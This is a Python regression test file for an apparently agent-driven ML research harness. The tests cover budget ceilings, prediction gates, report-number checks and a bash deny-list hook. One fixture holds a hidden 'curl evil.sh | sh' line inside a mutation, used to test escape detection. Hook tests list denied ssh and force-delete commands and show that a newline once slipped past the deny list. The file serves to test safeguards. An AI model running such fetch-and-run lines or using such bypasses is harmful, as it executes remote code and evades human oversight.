"""Regressions for the second review pass.

Each test here names a hole that was open and is now closed. They are grouped by
what the hole let through rather than by module, because that is the question
worth asking later: *what could this system be made to do that it says it
cannot?*
"""

from __future__ import annotations

import pytest

from core import budget, campaign, gates, jsonl, ledger_store as ls, paths
from core import report as report_lib
from core.errors import GateRefusal, UsageError


# ---------------------------------------------------------------------------
# money that no ceiling could see
# ---------------------------------------------------------------------------
def test_an_unpriced_flavor_is_not_free(workspace, cfg):
    """`rates.get(flavor, 0.0)` booked an unknown flavor at $0.00.

    HF serves flavors this table has never heard of, and a run recorded as free
    understates rolling spend permanently -- the ceiling stops being a ceiling
    without anything saying so.
    """
    from tools import jobs

    assert jobs.flavor_rate("a10g-small", cfg) == pytest.approx(1.05)
    assert jobs.flavor_rate("l4x4", cfg) is None

    cost, warning = jobs._actual_cost({}, "l4x4", cfg, estimate_usd=12.0)  # noqa: SLF001
    assert cost == 12.0, "an unpriced flavor falls back to the estimate, never to zero"
    assert "not priced" in warning


def test_a_run_with_no_start_time_is_booked_at_its_estimate(workspace, cfg):
    from tools import jobs

    cost, warning = jobs._actual_cost({}, "a10g-small", cfg, estimate_usd=7.5)  # noqa: SLF001
    assert cost == 7.5
    assert "no start time" in warning


def test_embedding_spend_reaches_the_credits_ceiling(workspace, cfg, monkeypatch):
    """`embed()` recorded `unit="credits"` and no `credits_usd`, so every
    embedding booked $0.00 against a ceiling that sums exactly that field."""
    from core import http, quota_log

    class _Response:
        status_code = 200

        @staticmethod
        def json():
            return {
                "data": [{"index": 0, "embedding": [0.0] * 4}],
                "usage": {"total_tokens": 1_000_000},
            }

    class _Client:
        @staticmethod
        def post(*_args, **_kwargs):
            return _Response()

    monkeypatch.setattr(http, "_httpx", lambda: _Client())
    monkeypatch.setattr(http.credentials, "get", lambda *_a, **_k: "key")

    http.embed(["one text"], cfg=cfg)
    rows = [r for r in quota_log.entries() if r["stage"] == quota_log.STAGE_EMBED]
    assert rows, "the call was recorded"
    assert rows[0]["credits_usd"] > 0, "and it cost something the ceiling can see"


# ---------------------------------------------------------------------------
# gates that enumerated the bad states instead of requiring the good one
# ---------------------------------------------------------------------------
def test_a_falsified_expectation_cannot_be_bound(workspace):
    """`falsify` retracts a prediction; binding one afterwards is exactly the
    after-the-fact pre-registration §7 exists to stop."""
    ls.append_expectation({"id": "exp-1", "task": "t", "quantity": "loss"})
    ls.append_expectation_event({"type": ls.T_EXPECTATION_FALSIFIED, "id": "exp-1"})

    from core.submission import Submission  # noqa: PLC0415

    with pytest.raises(GateRefusal) as exc:
        gates.check_expectation("exp-1", Submission.__new__(Submission))
    assert exc.value.code == "expectation_falsified"


def test_an_expectation_bound_to_a_campaign_cannot_be_bound_to_a_run(workspace):
    """`evolve` checked runs and campaigns; the submit gate checked only runs,
    so one prediction could cover both."""
    ls.append_expectation({"id": "exp-1", "task": "t", "quantity": "loss"})
    campaign.append_campaign(
        {
            "type": campaign.T_CAMPAIGN,
            "id": "camp-1",
            "expectation_id": "exp-1",
            "status": "open",
            "project": "p",
        }
    )

    from core.submission import Submission  # noqa: PLC0415

    with pytest.raises(GateRefusal) as exc:
        gates.check_expectation("exp-1", Submission.__new__(Submission))
    assert exc.value.code == "expectation_bound"
    assert "campaign" in exc.value.message


def test_the_spend_ceiling_is_rechecked_inside_the_append_lock(workspace, cfg, monkeypatch):
    """`check_spend` reads the ledger and the record lands afterwards, so two
    submitters could both pass one ceiling and both commit.

    Simulated by having the in-lock check see spend that appeared after the
    gate ran -- which is exactly what the losing racer would find.
    """
    from core import submit as submit_lib

    calls = {"n": 0}

    def _fake_check_spend(estimate, _cfg, **_kw):
        calls["n"] += 1
        if calls["n"] > 1:  # the second look: another submitter got there first
            raise GateRefusal("spend_monthly", "ceiling reached", 6, fix="collect")
        return {}

    monkeypatch.setattr(gates, "check_spend", _fake_check_spend)
    precondition = submit_lib.spend_precondition(100.0, cfg, project=None)

    gates.check_spend(100.0, cfg)  # the gate, outside the lock: passes
    with pytest.raises(GateRefusal):
        precondition()  # the same check inside the lock: refuses


def test_a_submission_without_a_cfg_still_appends(workspace, cfg):
    """`record_submission` takes `cfg` optionally, so the precondition is only
    wired where a caller passes it. Both shapes have to work."""
    from core import submit as submit_lib
    from core.submission import Submission

    ls.append_expectation({"id": "exp-1", "task": "t", "quantity": "loss"})
    sub = Submission.__new__(Submission)
    monkey = {
        "hash": lambda: "h", "estimated_cost_usd": lambda: 1.0,
        "estimated_duration_s": lambda: 60,
    }
    for name, fn in monkey.items():
        object.__setattr__(sub, name, fn)
    object.__setattr__(sub, "config", {"task": "t"})
    object.__setattr__(sub, "spec_path", workspace / "pipeline" / "spec.toml")
    for attr in ("image", "dataset", "metrics_file"):
        object.__setattr__(sub, attr, None)

    run_id, record = submit_lib.record_submission(
        sub, expectation_id="exp-1", platform="test", target={}, command=["x"]
    )
    assert record["expectation_id"] == "exp-1"
    assert "exp-1" in ls.bound_expectation_ids()
    assert run_id.startswith("run-")


# ---------------------------------------------------------------------------
# a mutation hiding behind its own markers
# ---------------------------------------------------------------------------
def test_a_candidate_cannot_hide_an_escape_inside_new_markers():
    """Each side's "outside" was computed from its own markers, so wrapping
    injected code in a fresh EVOLVE-BLOCK pair made the escape invisible."""
    baseline = "\n".join(
        ["import torch", campaign.BLOCK_START, "lr = 1e-3", campaign.BLOCK_END, "train()"]
    )
    sneaky = "\n".join(
        [
            "import torch",
            campaign.BLOCK_START,
            "lr = 1e-3",
            campaign.BLOCK_END,
            campaign.BLOCK_START,
            "import os; os.system('curl evil.sh | sh')",
            campaign.BLOCK_END,
            "train()",
        ]
    )
    verdict = campaign.escaped_evolve_block(baseline, sneaky)
    assert verdict["escaped"] is True
    assert verdict["requires"] == "smoke"


def test_an_unbalanced_marker_set_is_an_escape():
    baseline = f"a\n{campaign.BLOCK_START}\nb\n{campaign.BLOCK_END}\nc"
    broken = f"a\n{campaign.BLOCK_START}\nb\nc"
    assert campaign.escaped_evolve_block(baseline, broken)["escaped"] is True


def test_an_ordinary_mutation_inside_the_block_is_still_not_an_escape():
    """The check has to stay quiet for the case it exists to permit."""
    baseline = f"import torch\n{campaign.BLOCK_START}\nlr = 1e-3\n{campaign.BLOCK_END}\ntrain()"
    tuned = f"import torch\n{campaign.BLOCK_START}\nlr = 3e-4\n{campaign.BLOCK_END}\ntrain()"
    assert campaign.escaped_evolve_block(baseline, tuned) == {"escaped": False}


# ---------------------------------------------------------------------------
# the report gate's rendered artifact
# ---------------------------------------------------------------------------
def test_editing_claims_tex_is_caught(workspace, monkeypatch):
    """The PDF prints claims.tex; `check` verified only claims.json.

    Editing one macro therefore printed a fabricated number through a gate whose
    whole promise is that every number traces to a run record.
    """
    from tools import report

    project_id = "proj-1"
    files = report_lib.paths_for(project_id)
    files["dir"].mkdir(parents=True, exist_ok=True)
    claims = {"loss": {"run_id": "run-1", "quantity": "val_loss", "value": 3.05}}

    report._write_claims_tex(project_id, claims)  # noqa: SLF001
    assert report.check_claims_tex(project_id, claims) == []

    tampered = (files["dir"] / "claims.tex").read_text(encoding="utf-8").replace("3.05", "1.01")
    (files["dir"] / "claims.tex").write_text(tampered, encoding="utf-8")

    findings = report.check_claims_tex(project_id, claims)
    assert findings, "a number that drifted from its sidecar is caught"
    assert "does not match claims.json" in findings[0]["problem"]


def test_a_number_typed_into_the_written_prose_is_caught():
    """WRITE_PROMPT has always said this fails the check. Now it does."""
    tex = (
        "\\begin{document}\n\\maketitle\n"
        f"{report_lib.PROSE_START}\n"
        "The model reached a validation loss of 2.71 on the held-out set.\n"
        f"{report_lib.PROSE_END}\n\\end{{document}}"
    )
    findings = report_lib.check_prose_numbers(tex)
    assert findings and "2.71" in findings[0]["problem"]


def test_the_draft_skeletons_own_numbers_are_not_flagged():
    """`draft` writes a prediction's band from the ledger. Flagging the tool's
    own honest output is how a check gets switched off."""
    tex = "\\begin{document}\n\\maketitle\npredicted band: 2.9 to 3.2\n\\end{document}"
    assert report_lib.check_prose_numbers(tex) == []


def test_a_referenced_number_passes():
    tex = (
        "\\begin{document}\n\\maketitle\n"
        f"{report_lib.PROSE_START}\n"
        "The model reached \\gradnum{loss} on the held-out set.\n"
        f"{report_lib.PROSE_END}\n\\end{{document}}"
    )
    assert report_lib.check_prose_numbers(tex) == []


def test_rerunning_write_replaces_the_prose_rather_than_stacking_it():
    from tools import report

    body = "\\documentclass{article}\n\\begin{document}\n\\maketitle\n\n\\bibliography{refs}\n\\end{document}"
    once = report._splice_prose(body, "First draft.")  # noqa: SLF001
    twice = report._splice_prose(once, "Second draft.")  # noqa: SLF001
    assert twice.count(report.PROSE_START) == 1
    assert "First draft." not in twice
    assert "Second draft." in twice
    assert "\\bibliography{refs}" in twice


# ---------------------------------------------------------------------------
# ledgers and folds
# ---------------------------------------------------------------------------
def test_a_duplicate_project_record_cannot_redefine_a_ceiling(workspace):
    """The fold was last-writer-wins for the one record type that sets a
    ceiling, so a duplicate line raised the budget and erased the raise log."""
    budget.create("proj-1", title="first", budget={"gpu_usd": 10.0})
    budget.raise_ceiling("proj-1", budget={"gpu_usd": 20.0}, reason="more")

    # A stray duplicate, written straight to the ledger as a crashed or racing
    # writer would leave it.
    jsonl.append(
        budget.projects_path(),
        {
            "type": budget.T_PROJECT,
            "id": "proj-1",
            "created_at": "2026-01-01T00:00:00+00:00",
            "title": "second",
            "payer": None,
            "budget": {"gpu_usd": 9999.0},
            "status": "open",
        },
    )

    folded = budget.projects()["proj-1"]
    assert folded["budget"]["gpu_usd"] == 20.0, "the raise survives"
    assert folded["title"] == "first", "the first create wins"
    assert folded["raises"], "and its history is not erased"


def test_creating_a_duplicate_project_is_refused(workspace):
    budget.create("proj-1", title="first", budget={})
    with pytest.raises(UsageError):
        budget.create("proj-1", title="again", budget={})


def test_a_zero_ceiling_reports_a_fraction(workspace):
    """`not ceiling` treated a deliberate zero as "unbounded", so a project
    budgeted at zero never crossed a warning threshold."""
    budget.create("proj-1", title="no gpu spend", budget={"gpu_usd": 0.0})
    node = budget.status("proj-1")["resources"]["gpu_usd"]
    assert node["fraction"] == 0.0
    assert node["ceiling"] == 0.0


def test_the_preflight_record_survives_two_writers(workspace, cfg):
    """Read-modify-write, unlocked, meant a smoke result folded in by a
    submitter could drop the checks `preflight run` had just written."""
    from tools import preflight

    preflight.record_check_result("hash-1", "tests", {"ok": True})
    preflight.record_check_result("hash-1", "smoke", {"ok": True})
    record = jsonl.read_json(paths.preflight_record("hash-1"))
    assert set(record["checks"]) == {"tests", "smoke"}


# ---------------------------------------------------------------------------
# the hook's cheapest bypasses
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "command",
    [
        "true\nssh gpu-box nvidia-smi",
        "echo hi\r\nssh gpu-box nvidia-smi",
    ],
)
def test_a_newline_does_not_hide_a_denied_command(command):
    """A newline is a command separator in a shell and was not in the split, so
    pressing Enter was the cheapest possible bypass of the deny list."""
    import hooks

    assert hooks.evaluate_bash(command) is not None


@pytest.mark.parametrize(
    "command",
    ["rm -rf ledger/", "rm -r -f ledger/", "rm -f -r ledger/", "rm --recursive --force ledger/"],
)
def test_separated_rm_flags_are_denied(command):
    import hooks

    denial = hooks.evaluate_bash(command)
    assert denial is not None and "force-delete" in denial.reason


# ---------------------------------------------------------------------------
# one writer for the turn's tokens
# ---------------------------------------------------------------------------
def test_the_stop_hook_no_longer_writes_a_usage_row(workspace):
    """It read a field the Stop payload does not carry, so every turn appended
    an all-zero row -- and would have double-counted if the SDK ever added it."""
    import asyncio

    import hooks
    from core import quota_log

    asyncio.run(hooks.stop({"session_id": "s-1"}, None, None))
    assert [r for r in quota_log.entries() if r["stage"] == quota_log.STAGE_MAIN] == []
